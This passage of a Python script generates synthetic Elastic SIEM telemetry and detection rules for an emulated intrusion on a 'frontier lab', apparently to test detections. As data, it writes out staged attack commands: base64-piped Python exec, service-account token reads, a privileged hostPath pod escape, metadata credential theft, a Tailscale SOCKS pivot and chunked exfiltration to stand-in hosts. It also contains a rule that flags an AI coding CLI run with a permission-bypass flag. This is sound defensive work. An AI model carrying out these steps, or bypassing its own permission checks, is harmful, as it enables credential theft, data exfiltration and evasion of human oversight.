        session_credential_from_console=True, access_key_id="ASIACONSOLE00000000",
    ))
    for i, (action, provider) in enumerate(calls):
        docs.append(_aws_cloudtrail_doc(
            run_id, run_tag, bucket, 1 + i, "cloud_iam_enumeration",
            event_action=action, event_provider=provider,
            user_identity_type="AssumedRole", arn=arn,
            user_name="frontier-node-role", user_agent_name="aws-cli",
            access_key_id=f"ASIAFRONTIER{suffix}", as_org=org,
        ))
    return docs


OOTB_EMITTERS: dict[str, Callable[[str, str, dt.datetime], list[tuple[str, dict[str, Any]]]]] = {
    "web_child": emit_web_child,
    "web_command": emit_web_command,
    "base64_pipe": emit_base64_pipe,
    "cred_path": emit_cred_path,
    "curl_socks": emit_curl_socks,
    "linux_tunnel": emit_linux_tunnel,
    "node_curl": emit_node_curl,
    "genai_cli_bypass": emit_genai_cli_bypass,
    "k8s_direct_api_curl": emit_k8s_direct_api_curl,
    "k8s_tokenrequest": emit_k8s_tokenrequest,
    "k8s_secret_ua": emit_k8s_secret_ua,
    "k8s_secret_sa": emit_k8s_secret_sa,
    "k8s_secrets_list": emit_k8s_secrets_list,
    "k8s_privileged_pod": emit_k8s_privileged_pod,
    "k8s_denied_sa": emit_k8s_denied_sa,
    "k8s_self_subject": emit_k8s_self_subject,
    "k8s_multi_resource": emit_k8s_multi_resource,
    "aws_assumerole_webidentity": emit_aws_assumerole_webidentity,
    "aws_sts_getcalleridentity": emit_aws_sts_getcalleridentity,
    "aws_ec2_role_getcalleridentity": emit_aws_ec2_role_getcalleridentity,
    "aws_discovery_cli": emit_aws_discovery_cli,
}


# Stable prebuilt rule_id -> synthetic emitter. Verified to fire against the
# Elastic 9.x prebuilt package via the Detection Engine preview + manual run.
OOTB_RULE_TARGETS: list[OotbRuleTarget] = [
    OotbRuleTarget(
        "f16fca20-4d6c-43f9-aec1-20b6de3b0aeb", "Suspicious Child Execution via Web Server",
        "dataset_worker_foothold", "web_child", "endpoint_process",
        "linux exec, parent python app.py, child curl in /usr/bin",
    ),
    OotbRuleTarget(
        "6148b9f5-5b12-4704-9ef7-f4b4c5dd9bb5", "Suspicious Command Execution via Web Server",
        "dataset_worker_foothold", "web_command", "endpoint_process",
        "linux exec, parent python server.py, child bash -c id",
    ),
    OotbRuleTarget(
        "5bdad1d5-5001-4a13-ae99-fa8619500f1a", "Base64 Decoded Payload Piped to Interpreter",
        "encoded_c2", "base64_pipe", "endpoint_process",
        "sequence: python -c b64decode then bash, shared parent within 3s",
    ),
    OotbRuleTarget(
        "5f0fff18-f340-444b-9a98-c49ade766ff4", "Kubernetes and Cloud Credential Path Access via Process Arguments",
        "linux_recon_secrets", "cred_path", "endpoint_process",
        "linux exec, cat of serviceaccount/token path in process.args",
    ),
    OotbRuleTarget(
        "4df91789-7859-4bc4-9c5a-6b56bfa81a8b", "Kubernetes Service Account Token Created via TokenRequest API",
        "k8s_token_rbac", "k8s_tokenrequest", "k8s_audit",
        "audit create serviceaccounts/token by non-system SA",
    ),
    OotbRuleTarget(
        "a4c8e901-2b7f-4d6e-9a3c-8e1f0d5b6c2a", "Kubernetes Secret get or list with Suspicious User Agent",
        "k8s_token_rbac", "k8s_secret_ua", "k8s_audit",
        "audit get secrets with user_agent curl/*",
    ),
    OotbRuleTarget(
        "f8a31c62-0d4e-4b9a-b7e1-6c2a9d4e8f10", "Kubernetes Secret get or list from Node or Pod Service Account",
        "k8s_token_rbac", "k8s_secret_sa", "k8s_audit",
        "audit get secrets by system:serviceaccount:* from non-loopback IP",
    ),
    OotbRuleTarget(
        "7e3f9a2b-1c4d-5e6f-8a0b-9c8d7e6f5a4b", "Kubernetes Secrets List Across Cluster or Sensitive Namespaces",
        "k8s_token_rbac", "k8s_secrets_list", "k8s_audit",
        "audit list secrets on /api/v1/namespaces/kube-system/secrets",
    ),
    OotbRuleTarget(
        "c7908cac-337a-4f38-b50d-5eeb78bdb531", "Kubernetes Privileged Pod Created",
        "k8s_privileged_hostpath", "k8s_privileged_pod", "k8s_audit",
        "audit create pods, container securityContext.privileged=true",
    ),
    OotbRuleTarget(
        "2abda169-416b-4bb3-9a6b-f8d239fd78ba", "Kubernetes Pod Created with a Sensitive hostPath Volume",
        "k8s_privileged_hostpath", "k8s_privileged_pod", "k8s_audit",
        "audit create pods, volumes.hostPath.path='/'",
    ),
    OotbRuleTarget(
        "df7fda76-c92b-4943-bc68-04460a5ea5ba", "Kubernetes Pod Created With HostPID",
        "k8s_privileged_hostpath", "k8s_privileged_pod", "k8s_audit",
        "audit create pods, spec.hostPID=true",
    ),
    OotbRuleTarget(
        "12cbf709-69e8-4055-94f9-24314385c27e", "Kubernetes Pod Created With HostNetwork",
        "k8s_privileged_hostpath", "k8s_privileged_pod", "k8s_audit",
        "audit create pods, spec.hostNetwork=true, namespace lab-prod",
    ),
    OotbRuleTarget(
        "764c8437-a581-4537-8060-1fdb0e92c92d", "Kubernetes Pod Created With HostIPC",
        "k8s_privileged_hostpath", "k8s_privileged_pod", "k8s_audit",
        "audit create pods, spec.hostIPC=true",
    ),
    OotbRuleTarget(
        "ae32268b-bfd0-4c35-b002-13461b5830ca", "AWS AssumeRoleWithWebIdentity from Kubernetes SA and External ASN",
        "cloud_iam_enumeration", "aws_assumerole_webidentity", "aws_cloudtrail",
        "cloudtrail sts AssumeRoleWithWebIdentity, SA user, non-Amazon ASN",
    ),
    OotbRuleTarget(
        "734239fe-eda8-48c0-bca8-9e3dafd81a88", "Curl SOCKS Proxy Activity from Unusual Parent",
        "mesh_vpn_pivot", "curl_socks", "endpoint_process",
        "linux exec curl --socks5-hostname with shell parent",
    ),
    OotbRuleTarget(
        "8c8df61f-ed2a-4832-87b8-ee30812606e0", "Potential Linux Tunneling and/or Port Forwarding via Command Line",
        "mesh_vpn_pivot", "linux_tunnel", "endpoint_process",
        "linux exec ssh -L with IP:port:IP:port command line",
    ),
    # Advertised rules newly covered so the page's SIEM list actually fires.
    OotbRuleTarget(
        "d9af2479-ad13-4471-a312-f586517f1243", "Curl or Wget Spawned via Node.js",
        "dataset_worker_foothold", "node_curl", "endpoint_process",
        "linux exec, parent node, child curl to external http URL (no localhost)",
    ),
    OotbRuleTarget(
        "c1326e45-6d3c-4a2d-9882-606a0c310299", "GenAI CLI Started with Unsafe Permission Bypass",
        "dataset_worker_foothold", "genai_cli_bypass", "endpoint_process",
        "linux exec, process.name claude with --dangerously-skip-permissions",
    ),
    OotbRuleTarget(
        "b53f1d73-150d-484d-8f02-222abeb5d5fa", "Kubernetes Direct API Request via Curl or Wget",
        "k8s_recon_discovery", "k8s_direct_api_curl", "endpoint_process",
        "linux exec, curl command line hitting /api/v1/namespaces/*/secrets",
    ),
    OotbRuleTarget(
        "63c056a0-339a-11ed-a261-0242ac120002", "Kubernetes Denied Service Account Request via Unusual User Agent",
        "k8s_recon_discovery", "k8s_denied_sa", "k8s_audit",
        "audit forbid for system:serviceaccount:* with new/unusual user_agent.original",
    ),
    OotbRuleTarget(
        "12a2f15d-597e-4334-88ff-38a02cb1330b", "Kubernetes Suspicious Self-Subject Review via Unusual User Agent",
        "k8s_recon_discovery", "k8s_self_subject", "k8s_audit",
        "audit create selfsubjectrulesreviews by SA with new/unusual user_agent.original",
    ),
    OotbRuleTarget(
        "c2a91e88-4f4b-4e1d-9c7b-8fde112a9403", "Kubernetes Multi-Resource Discovery",
        "k8s_recon_discovery", "k8s_multi_resource", "k8s_audit",
        "esql: >=3 distinct get/list resources by one non-system SA in a 1m window",
    ),
    OotbRuleTarget(
        "30fbf4db-c502-4e68-a239-2e99af0f70da", "AWS STS GetCallerIdentity API Called for the First Time",
        "cloud_iam_enumeration", "aws_sts_getcalleridentity", "aws_cloudtrail",
        "new_terms: sts GetCallerIdentity success, first-seen (unique) user_identity.arn",
    ),
    OotbRuleTarget(
        "b2f8c4e1-6a73-4f1e-9c2d-8e5b0a1d3f7c", "AWS EC2 Role GetCallerIdentity from New Source AS Organization",
        "cloud_iam_enumeration", "aws_ec2_role_getcalleridentity", "aws_cloudtrail",
        "new_terms: AssumedRole i-* GetCallerIdentity from first-seen non-Amazon source AS org",
    ),
    OotbRuleTarget(
        "74f45152-9aee-11ef-b0a5-f661ea17fbcd", "AWS Discovery API Calls via CLI from a Single Resource",
        "cloud_iam_enumeration", "aws_discovery_cli", "aws_cloudtrail",
        "esql: >5 distinct Describe/Get/List aws-cli calls from one role in a 10s window",
    ),
]


def build_ootb_documents(
    run_id: str,
    run_tag: str,
    installed_rule_ids: set[str],
) -> tuple[list[tuple[str, dict[str, Any]]], list[OotbRuleTarget]]:
    """Build OOTB-satisfying telemetry, keyed to rules actually installed.

    Returns (docs, covered_targets). Shared emitters are only invoked once even
    when several targeted rules rely on the same document. Targets whose rule_id
    is not installed are skipped so the runner adapts to the stack.
    """
    base_time = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=3)
    covered = [t for t in OOTB_RULE_TARGETS if t.rule_id in installed_rule_ids]
    docs: list[tuple[str, dict[str, Any]]] = []
    seen: set[str] = set()
    for target in covered:
        if target.emitter in seen:
            continue
        seen.add(target.emitter)
        docs.extend(OOTB_EMITTERS[target.emitter](run_id, run_tag, base_time))
    return docs, covered


class ApiError(RuntimeError):
    def __init__(self, method: str, url: str, status: int, payload: Any):
        super().__init__(f"{method} {url} failed with HTTP {status}: {payload}")
        self.method = method
        self.url = url
        self.status = status
        self.payload = payload


@dataclass
class Auth:
    header: str

    @staticmethod
    def from_args(args: argparse.Namespace) -> "Auth":
        api_key = args.api_key or os.getenv("ELASTIC_API_KEY")
        if api_key:
            return Auth(f"ApiKey {api_key}")

        username = args.username or os.getenv("ELASTIC_USERNAME")
        password = args.password or os.getenv("ELASTIC_PASSWORD")
        if username and password:
            encoded = base64.b64encode(f"{username}:{password}".encode()).decode()
            return Auth(f"Basic {encoded}")

        raise SystemExit(
            "Missing auth. Set ELASTIC_API_KEY, or set ELASTIC_USERNAME and "
            "ELASTIC_PASSWORD, or pass --api-key / --username / --password."
        )


class HttpClient:
    def __init__(self, base_url: str, auth: Auth, insecure: bool = False):
        self.base_url = base_url.rstrip("/")
        self.auth = auth
        self.context = ssl._create_unverified_context() if insecure else None

    def request(
        self,
        method: str,
        path: str,
        body: Any | None = None,
        content_type: str = "application/json",
        ok: tuple[int, ...] = (200, 201),
        timeout: int = 60,
    ) -> Any:
        url = self.base_url + path
        data = None
        if body is not None:
            if content_type == "application/x-ndjson":
                data = body.encode()
            else:
                data = json.dumps(body).encode()

        headers = {"Authorization": self.auth.header, "kbn-xsrf": "true"}
        if body is not None:
            headers["Content-Type"] = content_type

        request = urllib.request.Request(url, data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(request, timeout=timeout, context=self.context) as response:
                raw = response.read().decode()
                if response.status not in ok:
                    raise ApiError(method, url, response.status, raw)
                if not raw:
                    return None
                try:
                    return json.loads(raw)
                except json.JSONDecodeError:
                    return raw
        except urllib.error.HTTPError as error:
            raw = error.read().decode(errors="replace")
            try:
                payload = json.loads(raw)
            except json.JSONDecodeError:
                payload = raw
            if error.code in ok:
                return payload
            raise ApiError(method, url, error.code, payload) from None


class KibanaClient(HttpClient):
    def __init__(self, base_url: str, auth: Auth, space: str, insecure: bool = False):
        super().__init__(base_url, auth, insecure)
        self.space = space

    def kpath(self, path: str) -> str:
        if self.space and self.space != "default":
            return f"/s/{urllib.parse.quote(self.space)}{path}"
        return path

    def request(self, method: str, path: str, **kwargs: Any) -> Any:  # type: ignore[override]
        return super().request(method, self.kpath(path), **kwargs)


def now_run_id() -> str:
    return dt.datetime.now(dt.timezone.utc).strftime("%Y%m%d%H%M%S")


def stream_meta(index: str) -> dict[str, str]:
    dataset = index[len("logs-") : -len("-default")]
    return {"type": "logs", "dataset": dataset, "namespace": "default"}


def mitre(tactic_id: str, tactic_name: str, technique_id: str, technique_name: str) -> list[dict[str, Any]]:
    return [
        {
            "framework": "MITRE ATT&CK",
            "tactic": {
                "id": tactic_id,
                "name": tactic_name,
                "reference": f"https://attack.mitre.org/tactics/{tactic_id}/",
            },
            "technique": [
                {
                    "id": technique_id,
                    "name": technique_name,
                    "reference": f"https://attack.mitre.org/techniques/{technique_id}/",
                }
            ],
        }
    ]


def build_rules(run_id: str, run_tag: str) -> list[dict[str, Any]]:
    base = {
        "type": "query",
        "enabled": False,
        "index": ["logs-frontier_lab_agent_emulation.*"],
        "language": "kuery",
        "interval": "1m",
        "from": "now-3h",
        "max_signals": 100,
        "tags": [BASE_TAG, SOURCE_TAG, "custom-agent-intrusion-scenario", "attack-discovery-seed", run_tag],
        "author": ["Cursor synthetic emulation"],
        "license": "Elastic License v2",
    }

    def rule(
        slug: str,
        name: str,
        phase: str,
        description: str,
        risk: int,
        severity: str,
        tactic_id: str,
        tactic_name: str,
        technique_id: str,
        technique_name: str,
    ) -> dict[str, Any]:
        return {
            **base,
            "rule_id": f"frontier-agent-emulation-{slug}-{run_id}",
            "name": name,
            "description": description,
            "risk_score": risk,
            "severity": severity,
            "query": (
                f'labels.campaign_id: "{CAMPAIGN_ID}" and '
                f'labels.run_id: "{run_id}" and labels.attack_phase: "{phase}"'
            ),
            "threat": mitre(tactic_id, tactic_name, technique_id, technique_name),
        }

    return [
        rule(
            "dataset-worker-foothold",
            "Dataset Worker Local File Disclosure via External Reference",
            "dataset_worker_foothold",
            "Detects synthetic dataset-worker local file disclosure markers involving environment and source paths.",
            73,
            "high",
            "TA0001",
            "Initial Access",
            "T1190",
            "Exploit Public-Facing Application",
        ),
        rule(
            "encoded-c2",
            "Python Gzip Base64 Payload Execution",
            "encoded_c2",
            "Detects synthetic Python execution patterns that resemble compressed and base64 staged payload execution.",
            78,
            "high",
            "TA0011",
            "Command and Control",
            "T1105",
            "Ingress Tool Transfer",
        ),
        rule(
            "linux-recon-secrets",
            "Linux Service Account Token and Environment Discovery",
            "linux_recon_secrets",
            "Detects synthetic Linux discovery commands involving process, environment, and service-account token paths.",
            68,
            "medium",
            "TA0007",
            "Discovery",
            "T1083",
            "File and Directory Discovery",
        ),
        rule(
            "k8s-token-rbac",
            "Kubernetes Service Account TokenRequest and RBAC Review",
            "k8s_token_rbac",
            "Detects synthetic Kubernetes TokenRequest and self-access review activity from a workload identity.",
            82,
            "high",
            "TA0007",
            "Discovery",
            "T1069",
            "Permission Groups Discovery",
        ),
        rule(
            "k8s-privileged-hostpath",
            "Kubernetes Privileged Pod Created With HostPath Mount",
            "k8s_privileged_hostpath",
            "Detects synthetic Kubernetes audit events for privileged pod creation with hostPath-style node access.",
            91,
            "critical",
            "TA0004",
            "Privilege Escalation",
            "T1611",
            "Escape to Host",
        ),
        rule(
            "cloud-iam-enumeration",
            "Cloud Metadata Credential Access Followed by IAM Enumeration",
            "cloud_iam_enumeration",
            "Detects synthetic cloud metadata access and follow-on identity, compute, registry, and secrets enumeration.",
            80,
            "high",
            "TA0006",
            "Credential Access",
            "T1552",
            "Unsecured Credentials",
        ),
        rule(
            "mesh-vpn-pivot",
            "Tailscale Userspace Networking Proxy Started",
            "mesh_vpn_pivot",
            "Detects synthetic Tailscale userspace networking, memory state, and SOCKS proxy pivot behavior.",
            84,
            "high",
            "TA0008",
            "Lateral Movement",
            "T1090",
            "Proxy",
        ),
        rule(
            "github-supply-chain",
            "GitHub App Installation Token Created and Repository Access",
            "github_supply_chain",
            "Detects synthetic GitHub App token minting followed by repository access, pull request, and CI probing activity.",
            86,
            "high",
            "TA0001",
            "Initial Access",
            "T1195",
            "Supply Chain Compromise",
        ),
        rule(
            "deaddrop-exfil",
            "Chunked Exfiltration to Public Dead-Drop Services",
            "deaddrop_exfiltration",
            "Detects synthetic chunked outbound staging to public request-capture, paste, dataset, and proxy destinations.",
            88,
            "high",
            "TA0010",
            "Exfiltration",
            "T1041",
            "Exfiltration Over C2 Channel",
        ),
    ]


def build_documents(run_id: str, run_tag: str) -> list[tuple[str, dict[str, Any]]]:
    # Rule trigger map for the synthetic sections below.
    #
    # Each event gets labels.attack_phase set to one of these values. By default
    # the generated custom rules are the GUARANTEED detection path: they match
    # directly on labels.run_id + labels.attack_phase, so a normal run always
    # produces alerts. The same telemetry is ALSO shaped to exercise relevant
    # OOTB Elastic content when those SIEM rules / endpoint protections happen to
    # be installed and enabled, but OOTB firing is best-effort only: real OOTB
    # rules key off specific index patterns and event.*/process.*/
    # kubernetes.audit.*/aws.cloudtrail.* fields we do not fully reproduce here.
    #
    # The README documents the OOTB coverage intents; the per-phase notes below
    # call out the closest OOTB rules for each synthetic section.
    #
    # dataset_worker_foothold
    #   Custom: Dataset Worker Local File Disclosure via External Reference
    #   OOTB: mostly source context for the broader attack chain; closest
    #         endpoint content is file/secret access and suspicious interpreter
    #         execution once follow-on commands begin.
    #
    # encoded_c2
    #   Custom: Python Gzip Base64 Payload Execution
    #   SIEM: Base64 Decoded Payload Piped to Interpreter; Payload Downloaded
    #         by Interpreter and Piped to Interpreter
    #   EDR: Linux Payload Decoded and Decrypted via Built-in Utility; Decoded
    #        Payload Piped to Interpreter; Suspicious Python Encoded Payload
    #        Execution; Payload Downloaded and Piped to Interpreter
    #
    # linux_recon_secrets
    #   Custom: Linux Service Account Token and Environment Discovery
    #   SIEM: Kubernetes and Cloud Credential Path Access via Process Arguments;
    #         Kubernetes Service Account Secret Access
    #   EDR: Multi Value Secret Searching via Find; Potential Linux Credential
    #        Dumping via Proc Filesystem
    #
    # k8s_token_rbac
    #   Custom: Kubernetes Service Account TokenRequest and RBAC Review
    #   SIEM: Kubernetes Pod Exec Sensitive File or Credential Path Access, plus
    #         Kubernetes audit/RBAC discovery coverage where available
    #
    # k8s_privileged_hostpath
    #   Custom: Kubernetes Privileged Pod Created With HostPath Mount
    #   SIEM: Kubernetes Privileged Pod Created; Kubernetes Pod Created with a
    #         Sensitive hostPath Volume
    #   EDR: Potential Cgroup Privilege Escalation Container Escape via Mount;
    #        Potential CVE-2025-32463 Sudo Chroot Execution Attempt
    #
    # cloud_iam_enumeration
    #   Custom: Cloud Metadata Credential Access Followed by IAM Enumeration
    #   SIEM: AWS Secrets Manager Rapid Secrets Retrieval; First Time Seen AWS
    #         Secret Value Accessed in Secrets Manager; AWS IAM API Calls via
    #         Temporary Session Tokens
    #
    # mesh_vpn_pivot
    #   Custom: Tailscale Userspace Networking Proxy Started
    #   SIEM: Linux Tunneling and Port Forwarding; Curl SOCKS Proxy Detected via
    #         Defend for Containers
    #   EDR: Potential Linux Tunneling and/or Port Forwarding; Potential Network
    #        Traffic Tunneling via Proxychains
    #
    # github_supply_chain
    #   Custom: GitHub App Installation Token Created and Repository Access
    #   SIEM: High Number of Repository Cloning by User; High Number of Closed
    #         Pull Requests by User
    #
    # deaddrop_exfiltration
    #   Custom: Chunked Exfiltration to Public Dead-Drop Services
    #   EDR: File Download from or Upload to Hosting Service
    base_time = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=70)
    docs: list[tuple[str, dict[str, Any]]] = []
    sequence = 0

    def timestamp(minutes: int) -> str:
        return (base_time + dt.timedelta(minutes=minutes)).isoformat().replace("+00:00", "Z")

    def add(kind: str, phase: str, minutes: int, **fields: Any) -> None:
        nonlocal sequence
        sequence += 1
        index = STREAMS[kind]
        doc: dict[str, Any] = {
            "@timestamp": timestamp(minutes),
            "data_stream": stream_meta(index),
            "labels": {
                "campaign_id": CAMPAIGN_ID,
                "run_id": run_id,
                "attack_phase": phase,
                "emulation": BASE_TAG,
                "run_tag": run_tag,
                "sequence": sequence,
                "kill_chain_day": fields.pop("kill_chain_day", "day3"),
            },
            "tags": [BASE_TAG, SOURCE_TAG, "custom-agent-intrusion-scenario", run_tag],
            "event": {"kind": "event", "outcome": "success"},
            "related": {
                "hosts": ["lab-dataset-worker-01", "lab-k8s-node-01"],
                "user": ["svc-dataset-worker"],
                "ip": ["198.51.100.23", "203.0.113.45", "10.42.7.19"],
            },
        }

        def merge(target: dict[str, Any], source: dict[str, Any]) -> None:
            for key, value in source.items():
                if isinstance(value, dict) and isinstance(target.get(key), dict):
                    merge(target[key], value)
                else:
                    target[key] = value

        merge(doc, fields)
        docs.append((index, doc))

    def proc(phase: str, minutes: int, host: str, user: str, command: str, message: str, parent: str = "python3") -> None:
        add(
            "endpoint",
            phase,
            minutes,
            event={"category": ["process"], "type": ["start"], "action": "process_start", "dataset": "endpoint.events.process"},
            host={"name": host, "ip": "10.42.7.19"},
            user={"name": user},
            process={
                "name": command.split()[0].split("/")[-1],
                "command_line": command,
                "parent": {"name": parent},
            },
            message=message,
        )

    def net(phase: str, minutes: int, host: str, domain: str, ip: str, port: int, url: str, message: str) -> None:
        add(
            "endpoint",
            phase,
            minutes,
            event={"category": ["network"], "type": ["connection"], "action": "connection_attempted", "dataset": "endpoint.events.network"},
            host={"name": host, "ip": "10.42.7.19"},
            user={"name": "svc-dataset-worker"},
            destination={"domain": domain, "ip": ip, "port": port},
            url={"full": url, "domain": domain},
            message=message,
        )

    add(
        "app",
        "dataset_worker_foothold",
        1,
        kill_chain_day="day1",
        event={"category": ["configuration"], "type": ["access"], "action": "dataset_config_processed", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        file={"path": "/proc/self/environ"},
        lab={"dataset": {"name": "attacker/hdf5-raw-storage-probe", "config": "envu8"}},
        message="Synthetic dataset config processed HDF5 external raw storage pointing at /proc/self/environ.",
    )
    add(
        "app",
        "dataset_worker_foothold",
        3,
        kill_chain_day="day1",
        event={"category": ["configuration"], "type": ["access"], "action": "dataset_config_processed", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        file={"path": "/src/services/worker/src/worker/main.py"},
        lab={"dataset": {"name": "attacker/hdf5-raw-storage-probe", "config": "mainu8"}},
        message="Synthetic dataset config disclosed worker source path for pipeline reconnaissance.",
    )
    add(
        "app",
        "dataset_worker_foothold",
        6,
        kill_chain_day="day1",
        event={"category": ["process"], "type": ["start"], "action": "template_renderer_execution", "dataset": "dataset.worker"},
        host={"name": "lab-dataset-worker-01", "ip": "10.42.7.19"},
        user={"name": "svc-dataset-worker"},
        process={"name": "python3", "command_line": "python3 worker/main.py --render reference://synthetic-jinja-offset"},
        message="Synthetic Jinja2 template-render execution marker; no exploit payload executed.",
    )

    proc(
        "encoded_c2",
        8,
        "lab-dataset-worker-01",
        "svc-dataset-worker",
        'python3 -c "import gzip,base64; exec(gzip.decompress(base64.b64decode(\\"SYNTHETIC_BLOB\\")))"',
        "Synthetic gzip/base64 staged Python execution from dataset worker.",
    )
    net("encoded_c2", 9, "lab-dataset-worker-01", "capture.frontier-emulation.invalid", "198.51.100.23", 443, "https://capture.frontier-emulation.invalid/campaign/queue", "Synthetic outbound poll to public request-capture style C2 queue.")
    net("encoded_c2", 11, "lab-dataset-worker-01", "paste.frontier-emulation.invalid", "198.51.100.24", 443, "https://paste.frontier-emulation.invalid/raw/stage2", "Synthetic second-stage loader fetch from paste-style service.")
    add(
        "app",
        "encoded_c2",
        12,
        event={"category": ["network"], "type": ["protocol"], "action": "dead_drop_commit", "dataset": "dataset.api"},
        host={"name": "lab-dataset-worker-01"},
        user={"name": "svc-dataset-worker"},
        lab={"dataset": {"name": "attacker/frontier-dead-drop", "branch": "chunks/day1"}},
        message="Synthetic gzipped command output committed to attacker-controlled dataset branch as dead-drop.",
    )

    for offset, command in enumerate(
        [
            "id",
            "env",
            "cat /proc/self/mountinfo",
            "ls -la /root /pkg /tmp",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "getent hosts service-connector.internal.example",
        ]
    ):
        proc("linux_recon_secrets", 15 + offset, "lab-dataset-worker-01", "svc-dataset-worker", command, f"Synthetic Linux recon/secret enumeration command: {command}")

    kuser = "system:serviceaccount:lab-prod:svc-dataset-worker"
    add(
        "k8s",
        "k8s_token_rbac",
        25,
        event={"category": ["iam"], "type": ["access"], "action": "create_serviceaccount_token", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "kube-system",
            "audit": {
                "verb": "create",
                "requestURI": "/api/v1/namespaces/kube-system/serviceaccounts/ebs-csi-controller-sa/token",
                "user": {"username": kuser},
                "objectRef": {"resource": "serviceaccounts/token", "name": "ebs-csi-controller-sa", "namespace": "kube-system"},
            },
        },
        user={"name": kuser},
        message="Synthetic TokenRequest for CSI service account from compromised worker identity.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        27,
        event={"category": ["iam"], "type": ["access"], "action": "self_subject_rules_review", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "create",
                "requestURI": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                "user": {"username": kuser},
                "objectRef": {"resource": "selfsubjectrulesreviews", "apiGroup": "authorization.k8s.io"},
            },
        },
        user={"name": kuser},
        message="Synthetic SelfSubjectRulesReview to enumerate RBAC privileges.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        29,
        event={"category": ["configuration"], "type": ["access"], "action": "list_pods", "dataset": "kubernetes.audit"},
        kubernetes={"audit": {"verb": "list", "requestURI": "/api/v1/pods?limit=500", "user": {"username": kuser}, "objectRef": {"resource": "pods"}}},
        user={"name": kuser},
        message="Synthetic cluster-wide pod list from compromised service account.",
    )
    add(
        "k8s",
        "k8s_token_rbac",
        31,
        event={"category": ["configuration"], "type": ["access"], "action": "get_secrets", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "get",
                "requestURI": "/api/v1/namespaces/lab-prod/secrets/prod-worker-env",
                "user": {"username": kuser},
                "objectRef": {"resource": "secrets", "name": "prod-worker-env", "namespace": "lab-prod"},
            },
        },
        user={"name": kuser},
        message="Synthetic secret object read tied to worker environment credential exposure.",
    )
    add(
        "k8s",
        "k8s_privileged_hostpath",
        35,
        event={"category": ["configuration"], "type": ["creation"], "action": "create_privileged_pod", "dataset": "kubernetes.audit"},
        kubernetes={
            "namespace": "lab-prod",
            "audit": {
                "verb": "create",
                "requestURI": "/api/v1/namespaces/lab-prod/pods",
                "user": {"username": kuser},
                "objectRef": {"resource": "pods", "name": "lab-node-debug-synthetic", "namespace": "lab-prod"},
                "requestObject": {
                    "spec": {
                        "hostPID": True,
                        "hostNetwork": True,
                        "containers": [{"name": "debug", "securityContext": {"privileged": True}}],
                        "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}],
                    }
                },
            },
        },
        user={"name": kuser},
        host={"name": "lab-k8s-node-01", "ip": "10.42.8.10"},
        message="Synthetic privileged hostPath pod creation representing node pivot; no real pod was created.",
    )
    proc("k8s_privileged_hostpath", 37, "lab-k8s-node-01", "root", 'chroot /host /bin/sh -c "hostname; date; ls /var/lib/kubelet"', "Synthetic host filesystem inspection after privileged-pod style pivot.")

    aws_user = "arn:aws:sts::123456789012:assumed-role/frontier-node-role/i-0synthetic"
    for minutes, name, source, message in [
        (41, "GetCallerIdentity", "sts.amazonaws.com", "Synthetic STS identity validation from harvested node role."),
        (43, "DescribeVpcs", "ec2.amazonaws.com", "Synthetic VPC enumeration."),
        (45, "ListClusters", "eks.amazonaws.com", "Synthetic EKS cluster enumeration."),
        (47, "GetAuthorizationToken", "ecr.amazonaws.com", "Synthetic container registry token request."),
        (49, "ListSecrets", "secretsmanager.amazonaws.com", "Synthetic secrets inventory enumeration."),
    ]:
        add(
            "cloud",
            "cloud_iam_enumeration",
            minutes,
            event={"category": ["configuration"], "type": ["access"], "action": name, "dataset": "aws.cloudtrail", "provider": source},
            cloud={"provider": "aws", "account": {"id": "123456789012", "name": "frontier-prod-lab"}, "region": "us-west-2"},
            aws={"cloudtrail": {"event_name": name, "event_source": source, "user_identity": {"arn": aws_user, "type": "AssumedRole"}}},
            source={"ip": "203.0.113.45"},
            user={"name": aws_user},
            message=message,
        )
    net("cloud_iam_enumeration", 40, "lab-dataset-worker-01", "169.254.169.254", "169.254.169.254", 80, "http://169.254.169.254/latest/meta-data/iam/security-credentials/frontier-node-role", "Synthetic metadata credential retrieval marker using reserved lab telemetry only.")

    proc("mesh_vpn_pivot", 52, "lab-k8s-node-01", "root", "tailscaled --tun=userspace-networking --state=mem: --socket=/tmp/ts.sock --socks5-server=127.0.0.1:1055 --no-logs-no-support", "Synthetic mesh VPN daemon started in userspace networking mode.")
    proc("mesh_vpn_pivot", 53, "lab-k8s-node-01", "root", "tailscale --socket=/tmp/ts.sock up --auth-key=tskey-auth-FAKE-FRONTIER-EMULATION --hostname=frontier-sandbox-synthetic --accept-routes", "Synthetic mesh VPN enrollment with fake auth key.")
    net("mesh_vpn_pivot", 55, "lab-k8s-node-01", "source-connector.tailnet.invalid", "10.99.4.12", 443, "https://source-connector.tailnet.invalid/api/catalog", "Synthetic access to internal source-control connector over mesh VPN.")

    for minutes, action, message in [
        (58, "integration_installation_token.create", "Synthetic GitHub App installation token minted with contents/write and PR permissions."),
        (59, "repo.clone", "Synthetic private repository clone using short-lived app token."),
        (60, "repo.tree.list", "Synthetic repository tree enumeration for CI and benchmark markers."),
        (61, "pull_request.create", "Synthetic pull request opened to probe CI credential surface."),
        (62, "workflow_run.read", "Synthetic GitHub Actions read for CI context."),
    ]:
        add(
            "github",
            "github_supply_chain",
            minutes,
            event={"category": ["configuration"], "type": ["access"], "action": action, "dataset": "github.audit"},
            github={"actor": "lab-ci-bot", "org": "frontier-lab", "repo": "frontier-lab/internal-eval-harness", "app_id": "123456"},
            source={"ip": "203.0.113.45"},
            user={"name": "lab-ci-bot"},
            message=message,
        )

    for minutes, domain, url, message in [
        (64, "capture.frontier-emulation.invalid", "https://capture.frontier-emulation.invalid/exfil/chunk/001", "Synthetic chunked command output POST to request-capture style endpoint."),
